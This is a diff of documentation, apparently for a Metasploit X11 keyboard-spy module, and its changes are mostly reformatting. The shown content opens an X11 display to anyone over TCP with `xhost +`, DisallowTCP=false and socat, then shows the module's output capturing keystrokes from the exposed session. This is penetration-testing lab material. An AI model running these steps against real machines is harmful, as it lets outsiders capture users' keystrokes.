@@ -19,21 +19,21 @@ displayed at poll time. Keys may be repeated or missing.
 1. `sudo nano /etc/gdm/gdm.schemas`
 2. Find:
 
-```
-<schema>
-    <key>security/DisallowTCP</key>
-    <signature>b</signature>
-    <default>true</default>
-</schema>
-```
-- Change `true` to `false`
+    ```
+    <schema>
+     <key>security/DisallowTCP</key>
+     <signature>b</signature>
+     <default>true</default>
+    </schema>
+    ```
+  - Change `true` to `false`
 
 3. logout or reboot
-4. Verification: `sudo netstat -antp | grep 6000`
+4. Verification: ```sudo netstat -antp | grep 6000```
 
-```
-tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
-```
+    ```
+    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
+    ```
 
 5. Now, to verify you allow ANYONE to get on X11, type: `xhost +`
 
@@ -42,17 +42,17 @@ tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      
 1. `sudo nano /etc/lightdm/lightdm.conf`
 2. Under the `[SeatDefaults]` area, add:
 
-```
-xserver-allow-tcp=true
-allow-guest=true
-```
+    ```
+    xserver-allow-tcp=true
+    allow-guest=true
+    ```
 
 3. logout or reboot
-4. Verification: `sudo netstat -antp | grep 6000`
+4. Verification: ```sudo netstat -antp | grep 6000```
 
-```
-tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
-```
+    ```        	
+    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1806/X
+    ```
 
 5. Now, to verify you allow ANYONE to get on X11, type: `xhost +`
 
@@ -65,9 +65,9 @@ tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      
 1. `vi /etc/gdm/custom.conf`
 2. Under the `[security]` area, add:
 
-```
-DisallowTCP=false
-```
+    ```
+    DisallowTCP=false
+    ```
 
 3. logout/reboot
 4. Now, to verify you allow ANYONE to get on X11, type: `xhost +`
@@ -88,8 +88,7 @@ Getting X11 to listen on a TCP port is rather taxing, so we use socat to facilit
 1. `sudo apt-get install ubuntu-desktop socat` # overkill but it gets everything we need
 2. `sudo reboot` # prob a good idea since so much was installed
 3. `sudo xhost +` # must be done through gui, not through SSH
-4. `socat -d -d TCP-LISTEN:6000,fork,bind=<IP to listen to here> UNIX-CONNECT:/tmp/.X11-unix/X0`, you may need to
-use `X1` instead of `X0` depending on context.
+4. `socat -d -d TCP-LISTEN:6000,fork,bind=<IP to listen to here> UNIX-CONNECT:/tmp/.X11-unix/X0`, you may need to use `X1` instead of `X0` depending on context.
 
 ## Verification Steps
 
@@ -122,23 +121,23 @@ msf6 auxiliary(gather/x11_keyboard_spy) > run
 [*] Running module against 127.0.0.1
 
 [*] 127.0.0.1:6000 - Establishing TCP Connection
-[*] 127.0.0.1:6000 - (1/9) Establishing X11 connection
+[*] 127.0.0.1:6000 - [1/9] Establishing X11 connection
 [-] 127.0.0.1:6000 - Connection packet malfored (size: 8192), attempting to get read more data
 [+] 127.0.0.1:6000 - Successly established X11 connection
 [*] 127.0.0.1:6000 - Version: 11.0
 [*] 127.0.0.1:6000 - Screen Resolution: 958x832
 [*] 127.0.0.1:6000 - Resource ID: 33554432
 [*] 127.0.0.1:6000 - Screen root: 1320
-[*] 127.0.0.1:6000 - (2/9) Checking on BIG-REQUESTS extension
+[*] 127.0.0.1:6000 - [2/9] Checking on BIG-REQUESTS extension
 [+] 127.0.0.1:6000 -   Extension BIG-REQUESTS is present with id 134
-[*] 127.0.0.1:6000 - (3/9) Enabling BIG-REQUESTS
-[*] 127.0.0.1:6000 - (4/9) Creating new graphical context
-[*] 127.0.0.1:6000 - (5/9) Checking on XKEYBOARD extension
+[*] 127.0.0.1:6000 - [3/9] Enabling BIG-REQUESTS
+[*] 127.0.0.1:6000 - [4/9] Creating new graphical context
+[*] 127.0.0.1:6000 - [5/9] Checking on XKEYBOARD extension
 [+] 127.0.0.1:6000 -   Extension XKEYBOARD is present with id 136
-[*] 127.0.0.1:6000 - (6/9) Enabling XKEYBOARD
-[*] 127.0.0.1:6000 - (7/9) Requesting XKEYBOARD map
-[*] 127.0.0.1:6000 - (8/9) Enabling notification on keyboard and map
-[*] 127.0.0.1:6000 - (9/9) Creating local keyboard map
+[*] 127.0.0.1:6000 - [6/9] Enabling XKEYBOARD
+[*] 127.0.0.1:6000 - [7/9] Requesting XKEYBOARD map
+[*] 127.0.0.1:6000 - [8/9] Enabling notification on keyboard and map
+[*] 127.0.0.1:6000 - [9/9] Creating local keyboard map
 [+] 127.0.0.1:6000 - All setup, watching for keystrokes
 t
 e
